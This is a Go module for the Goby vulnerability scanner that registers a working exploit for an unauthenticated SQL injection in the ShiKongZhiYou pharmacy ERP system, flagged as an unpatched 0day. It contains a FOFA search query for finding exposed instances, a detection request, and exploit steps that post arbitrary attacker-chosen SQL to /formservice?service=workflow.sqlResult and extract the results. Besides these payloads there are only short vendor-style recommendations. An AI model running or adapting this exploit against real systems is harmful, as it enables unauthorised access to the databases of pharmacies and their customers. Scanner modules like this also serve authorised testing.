package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ShiKongZhiYou ERP Workflow.sqlresult SQL injection vulnerability",
    "Description": "<p>Shikong Zhiyou is a comprehensive solution provider of information technology in the pharmaceutical industry. Its business covers pharmacy ERP, CRM, WMS, mobile Internet and new pharmaceutical retail, smart pharmacies, and intelligent manufacturing. There are SQL injection vulnerabilities in Shikong Zhiyou system, remote attackers By inserting arbitrary SQL statements into the URL /formservice?service=workflow.sqlResult without logging in, an attacker can gain database permissions through this vulnerability.</p>",
    "Product": "ShiKongZhiYou-ERP",
    "Homepage": "http://www.91skzy.com/",
    "DisclosureDate": "2022-09-25",
    "Author": "2935900435@qq.com",
    "FofaQuery": "body=\"login.jsp?login=null\"",
    "GobyQuery": "body=\"login.jsp?login=null\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server with high privileges to further gain server system privileges.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.91skzy.com/\">http://www.91skzy.com/</a> </p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "exp",
            "type": "select",
            "value": "select user;,select * from sysdatabases;",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/formservice?service=workflow.sqlResult",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"sql\":\"select sys.fn_varbintohexstr(hashbytes('MD5','123456'));\",\"params\":{\"a\":\"11\"}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/formservice?service=workflow.sqlResult",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"sql\":\"{{{exp}}}\",\"params\":{\"a\":\"11\"}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "resoutput|lastbody|regex|<root>(.*?)</root>",
                "output|lastbody|text|{{{resoutput}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "时空智友 workflow.sqlResult SQL注入漏洞",
            "Product": "时空智友-ERP",
            "Description": "<p>时空智友是医药行业信息化全面解决方案提供商,业务涵盖药店ERP、CRM、WMS、移动互联及医药新零售、智慧药店、智能智造,时空智友系统的存在SQL注入漏洞，远程攻击者在无需登录的情况下可通过向 URL /formservice?service=workflow.sqlResult处插入任意SQL语句，攻击者可通过该漏洞获取数据库权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：</p><p><a href=\"http://www.91skzy.com/\" target=\"_blank\">http://www.91skzy.com/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "ShiKongZhiYou ERP Workflow.sqlresult SQL injection vulnerability",
            "Product": "ShiKongZhiYou-ERP",
            "Description": "<p>Shikong Zhiyou is a comprehensive solution provider of information technology in the pharmaceutical industry. Its business covers pharmacy ERP, CRM, WMS, mobile Internet and new pharmaceutical retail, smart pharmacies, and intelligent manufacturing. There are SQL injection vulnerabilities in Shikong Zhiyou system, remote attackers By inserting arbitrary SQL statements into the URL /formservice?service=workflow.sqlResult without logging in, an attacker can gain database permissions through this vulnerability.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.91skzy.com/\" target=\"_blank\">http://www.91skzy.com/</a>&nbsp;</p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server with high privileges to further gain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}